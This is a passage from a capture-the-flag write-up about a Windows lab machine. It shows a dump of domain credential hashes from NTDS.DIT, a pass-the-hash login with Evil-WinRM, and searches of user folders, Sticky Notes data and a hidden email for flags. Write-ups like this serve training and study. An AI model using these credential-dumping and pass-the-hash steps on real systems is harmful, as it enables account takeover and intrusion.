{{< highlight bash >}}
Impacket v0.10.1.dev1+20220513.140233.fb1e50c1 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:84a131ab8d386e13ab59b91fece79b2c:::
...
{{< /highlight >}}

We have the hash: <code>84a131ab8d386e13ab59b91fece79b2c</code>


Let's use Evil-WinRM:

{{< highlight bash >}}
$ evil-winrm -i 192.168.1.145 -u Administrator -H 84a131ab8d386e13ab59b91fece79b2c
{{< /highlight >}}

{{< highlight bash >}}
Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
{{< /highlight >}}

:)


Navigate back to C:\Users and "grep" for strings

{{< highlight bash >}}
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\..\
*Evil-WinRM* PS C:\Users> dir -Recurse | Select-String -pattern "FLAG{"


eescalera\Desktop\eescalera_flag.txt:1:FLAG{Mas_uno_por_revisar_sistema}
jenriques\Desktop\jenriques_flag.txt:1:FLAG{Buen_Password_Spraying_Eh?}
pcasimiro\Desktop\pscasimiro_flag.txt:1:FLAG{Pesadilla_en_el_trabajo}
sguerrero\Desktop\sguerrero_flag.txt:1:FLAG{Ay_Ay_Vigila_Tu_Puesto}
svc-spooler\Desktop\svc-spooler_flag.txt:1:FLAG{A_su_servicio}
{{< /highlight >}}


Bingo: <code>FLAG{Mas_uno_por_revisar_sistema}, FLAG{Buen_Password_Spraying_Eh?}, FLAG{Pesadilla_en_el_trabajo}, FLAG{Ay_Ay_Vigila_Tu_Puesto}, FLAG{A_su_servicio}</code>

![ZZZ](/images/ctfs/schneidelec/zzz.webp)

:)


We're missing two... but we already know where to look due to our previous *unintended forensics*

Navigate to <code>C:\Users\jenriques\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState</code>

{{< highlight bash >}}
*Evil-WinRM* PS C:\Users>cat "C:/Users/jenriques/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite-wal" | Select-String -pattern "FLAG{"
UU\id=90336dbc-1c1c-4b44-9248-0baeb830ae8d FLAG{Sticky_Notes_FTW}Yellow2bedc0aa-697a-4c7d-8dbd-73be78fea130cad54964-46bd-4474-b3e5-de66bf65232Ú64
U\id=61c9897a-1a87-45f1-aaf6-526d769313c5 Nombre: Saray Guerrero
{{< /highlight >}}

<code>FLAG{Sticky_Notes_FTW}</code>

Oh and...


We can look for hidden files...

{{< highlight bash >}}
*Evil-WinRM* PS C:\Users>Get-ChildItem -Recurse -Hidden
Directory: C:\Users\eescalera\Downloads


ModeLastWriteTime Length Name
----------------- ------ ----
-a-h--5/18/2022   8:05 PM201 private_email
{{< /highlight >}}

:)

{{< highlight bash >}}
*Evil-WinRM*</code> PS</code> cat "C:/Users/eescalera/Downloads/private_email"

[EmailTo]: eescalera@geohome.com
[EmailFrom]: ffuertes@geohome.com
[Subject]: Instagram

[Attachment]:

[Body]:
Toma, este es mi Instagram: https://www.instagram.com/ferfuertes1990/. ¡Sígueme!
{{< /highlight >}}


![Instagram](/images/ctfs/schneidelec/instagram.jpeg)


<code>FLAG{El_Buen_OSINT_Naito}</code>


<a href="https://www.youtube.com/watch?v=CS2kkzTfePU"><h3>12/12 Flags Found</h3></a>


<i>- mess with the best die like the rest.</i>
